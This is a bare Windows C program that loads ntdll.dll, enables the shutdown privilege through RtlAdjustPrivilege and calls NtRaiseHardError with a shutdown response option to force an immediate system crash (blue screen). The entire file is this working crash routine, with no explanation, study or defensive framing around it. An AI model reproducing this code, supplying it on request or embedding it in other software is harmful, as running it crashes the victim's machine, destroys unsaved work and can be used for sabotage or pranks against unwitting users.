#include <stdio.h>
#include <stdbool.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

int main() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");


    bool tmp1;
    unsigned int tmp2;
    if (RtlAdjustPrivilege(19, true, false, &tmp1) == STATUS_SUCCESS){
        NtRaiseHardError(0xc0000022, NULL, NULL, NULL, 6, &tmp2);
    }

    if(ntdll != NULL){
        FreeLibrary(ntdll);
    }
    return 0;
}
